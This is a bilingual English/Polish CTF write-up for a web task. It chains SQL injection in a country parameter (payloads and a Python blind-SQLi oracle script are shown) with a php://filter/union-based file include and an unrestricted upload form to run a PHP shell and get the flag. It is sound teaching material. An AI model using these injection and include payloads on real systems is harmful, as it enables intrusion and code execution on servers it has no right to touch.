# V1rus3pidem1c (web 100)

## ENG
[PL](#pl-version)

In the task we get a webpage where we can select a country from dropdown and for some countries this shows us file upload form and for some of them it doesn't.
For example there is a form for `Germany` and no form for `Russia`.

The country name is passed as GET parameter in the query, and we decide to see what exactly is done with it.
A little bit of fuzzing tells us that it goes into some SQL query into where condition.

With classic `country=Russia' or '1'='1` we get a form for Germany, which means we managed to exploit the task with SQL Injection.

We tried a bit to get some echo here, but couldn't, so we simply switched to run Blind SQLi attack.
We got a simple oracle function:

```
import requests
session = requests.session()

def is_true(condition):
    url = "http://tasks.ctf.com.ua:13372/index.php?country=Russia' or (%s) -- a" % condition
    result = session.get(url)
    return 'virus for Germany' in result.text


def main():
    print(is_true("1=1"))
    print(is_true("1=0"))


main()
```

And with this we can extract `Information_Schema.Tables` and `Information_Schema.Columns` data, with simple substring and byte-by-byte comparison using the oracle function.

This tells us there we have only a single user defined table and it contains only `countryID, countryName, scriptPath`.
Last parameter is especially interesting since it's an actual path to php script with form, which gets included on the page.
It's in form: `country/ge.php`, `country/tu.php` etc.

We could use our SQLi to include some other file by `index.php?country=' union select 'somefile.php' -- comment`, but we can't put any file on the server.
But since we control the include path we decided to check good old php wrappers and force the server to include: `php://filter/read=convert.base64-encode/resource=country/ge.php` and as expected we get a nice base64 contents of the php script.

It seems that the files uploaded by the form available for some countries actually get uploaded to the server!
We have there for example:

```php
<?php

	$target_dir = "uploads/";
	$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
	move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
	
	/*echo $_FILES["fileToUpload"]["tmp_name"] ."\n";
	var_dump($_FILES["fileToUpload"]);
	var_dump(file_exists($_FILES["fileToUpload"]["tmp_name"]));
	echo file_exists($target_file);*/
?>
```

So it's clear that we can use this form to upload a php shell to the server and then use SQLi to include it on the page and execute, because we know the file will be under `uploads/file_name`.

We proceed with this and find a hidden php file with flag: `h4ck1t{$QL&LFI=FR13ND$}`

## PL version

W zadaniu dostajemy link do strony internetowej gdzie możemy wybrać z listy jeden z krajów i dla niektórych pojawia się formularz uploadu plików a dla innych nie.

Na przykład dla `Germany` mamy formularz a dla `Russia` nie.

Nazwa kraju jest przesyłana jako parametr GET i spróbowaliśmy przetestować co się może dziać z tym parametrem.
Troche fuzzowania pokazało że parametr idzie bezpośrednio do query SQL do warunku where.

Klasycznym `country=Russia' or '1'='1` dostaliśmy formular dla Niemiec, co znaczy że mamy tam SQL Injection.

Próbowalismy dostać tam gdzieś echo, ale bez skutku, więc postanowiliśmy użyć Blind SQLi.
Przygotowalismy prostą funkcje:

```
import requests
session = requests.session()

def is_true(condition):
    url = "http://tasks.ctf.com.ua:13372/index.php?country=Russia' or (%s) -- a" % condition
    result = session.get(url)
    return 'virus for Germany' in result.text


def main():
    print(is_true("1=1"))
    print(is_true("1=0"))


main()
```

I możemy dzięki temu pobrać z `Information_Schema.Tables` i `Information_Schema.Columns` dane poprzez proste substring oraz porównywanie wartości bajt po bajcie za pomocą funkcji oracle.

Stąd wiemy, że jest tylko jedna tabela użytkownika i zawiera `countryID, countryName, scriptPath`.

Ostatni parametr jest szczególnie ciekawy bo zawiera ścieżkę do plików php, które są includowane na stronie.

Mają postać: `country/ge.php`, `country/tu.php` etc.

Moglibyśmy użyć naszego SQLi żeby includować jakiś inny plik przez `index.php?country=' union select 'somefile.php' -- comment` ale nie możemy póki co umieścić niczego na serwerze.

Niemniej skoro kontrolujemy ścieżkę do include to może stare dobre wrappery php zadziałają i czy serwer pozwoli includować: `php://filter/read=convert.base64-encode/resource=country/ge.php` i tak jak na to liczylismy, dostaliśmy ładne base64 z kodu skryptu.

Analiza kodu pozwala stwierdzić, że możemy uploadować pliki na serwer za pomocą skryptów dla niektórych krajów!
Mamy tam:

```php
<?php

	$target_dir = "uploads/";
	$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
	move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
	
	/*echo $_FILES["fileToUpload"]["tmp_name"] ."\n";
	var_dump($_FILES["fileToUpload"]);
	var_dump(file_exists($_FILES["fileToUpload"]["tmp_name"]));
	echo file_exists($target_file);*/
?>
```

Widać wyraźnie, że mozemy spokojnie wrzucić za pomocą formularza shell php na serwer i użyć SQLi żeby go includować i użyć, bo wiemy że jest dostępny pod `uploads/file_name`.

Umieszczamy więc nasz shell i odnajdujemy ukryty plik php z flagą: `h4ck1t{$QL&LFI=FR13ND$}`
